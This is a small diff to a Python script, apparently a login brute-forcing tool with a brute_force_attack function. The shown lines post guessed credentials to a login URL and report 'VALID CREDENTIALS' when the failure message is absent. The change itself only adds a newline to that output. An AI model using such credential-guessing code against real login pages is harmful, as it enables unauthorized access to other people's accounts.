@@ -68,7 +68,7 @@ def brute_force_attack(url):
 
             r = requests.post(main_url, headers=headers, cookies=cookies, data=data)
             if "Incorrect password" not in r.text:
-                print(f"[+] VALID CREDENTIALS:\n\tusername: {username}\n\tpassword: {password}")
+                print(f"\n[+] VALID CREDENTIALS:\n\tusername: {username}\n\tpassword: {password}")
                 break
 
 def print_help_panel():
